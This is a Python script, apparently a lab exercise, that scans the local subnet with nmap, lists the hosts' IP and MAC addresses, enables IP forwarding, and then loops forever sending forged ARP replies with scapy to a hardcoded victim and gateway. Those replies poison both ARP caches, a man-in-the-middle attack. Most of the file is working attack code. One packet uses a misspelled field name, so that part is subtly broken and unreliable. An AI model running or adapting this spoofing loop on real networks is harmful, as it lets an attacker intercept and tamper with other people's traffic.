import struct
import os
import subprocess
import socket
import re
import fcntl
from scapy.all import *
from time import *

"""
get ip address of host
link: https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib?page=1&tab=votes#tab-top
"""
def getHostIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

"""
get information of NIC using "ip addr" command
"""
def nicInfo():
    proc = subprocess.Popen(["ip addr"],stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    ipaddr = out.decode("utf-8")
    ip = re.findall("\d+\.\d+\.\d+\.\d+\/\d+", ipaddr)
    mac = re.findall(
        "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", ipaddr)
    return ip, mac


"""
by "nmap" command, we can scan all device which have 
link : https://stackoverflow.com/questions/13212187/is-it-possible-to-get-the-mac-address-for-machine-using-nmap
link : https://superuser.com/questions/887887/different-behavior-sudo-nmap-vs-just-nmap
"""
def nmap(ip):
    tmp = "nmap -sn -n " + ip 
    print("Command is ",tmp)
    proc = subprocess.Popen([tmp], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    out2 = out.decode("utf-8")
    return out2

"""
https://stackoverflow.com/questions/2761829/python-get-default-gateway-for-a-local-interface-ip-address-in-linux/6556951
"""
def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                # If not default route or not RTF_GATEWAY, skip it
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

"""
regular expression for:
ipV4 : https://stackoverflow.com/questions/4260467/what-is-a-regular-expression-for-a-mac-address
MAC address : https://stackoverflow.com/questions/4260467/what-is-a-regular-expression-for-a-mac-address
"""

"""
https://stackoverflow.com/questions/159137/getting-mac-address
"""
def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack(
        '256s', bytes(ifname, 'utf-8')[:15]))
    return ':'.join('%02x' % b for b in info[18:24])

def port_forwarding():
    flag = 1
    flag = str(flag)
    os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')


if __name__ == "__main__":
    
    # get ip without /24
    ip      = getHostIp()
    hostip  = ip 
    hostmac = getHwAddr('enp0s3')

    # ip and MAC address of command "ip addr"
    # search Ip with subnet mask by using ip we already know
    # example:
    #   nicip: 192.168.1.1/24, 192.168.1.2/24, etc
    #   ip : 192.168.1.1
    (nicip, nicmac) = nicInfo()
    for i in nicip:
        # print(ip, " ", i.split("/")[0])
        if(i.split("/")[0]==ip):
            ip = i
            break

    result = nmap(ip)
    print(result)

    # regular expression for IPv4
    ip = re.findall("\d+\.\d+\.\d+\.\d+", result)
    # regular expression for MAC 
    mac = re.findall(
        "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", result)

    default_gateway = get_default_gateway_linux()

    for i in ip:
        if(i == hostip):
            ip.remove(i)
            break
        
    _len = len(ip)
    for i in range(0, _len):
        if(ip[i] == default_gateway):
            ip.remove(ip[i])
            mac.remove(mac[i])
            break

    print("")

    print("default Gateway: ", default_gateway)
    print("host ip: ", hostip)
    print("host MAC", hostmac)

    print("")


    print("----------------------------------------------")
    print("IP                       MAC")
    print("----------------------------------------------")    

    for i in range(0,len(ip)):
        print("%-18s       %s" % (ip[i],mac[i]))

    victimpacket = ARP(op=2, pdst="10.0.2.5", hwdst="08:00:27:df:ef:2c",
                     psrc="10.0.2.1", hwsrc="08:00:27:25:a4:94")

    routerpacket = ARP(op=2, pdarpst="10.0.2.1", hwdst="52:54:00:12:35:00",
                 psrc="10.0.2.5", hwsrc="08:00:27:25:a4:94")

    port_forwarding()
    while(1):
        send(victimpacket)
        send(routerpacket)
        sleep(2)
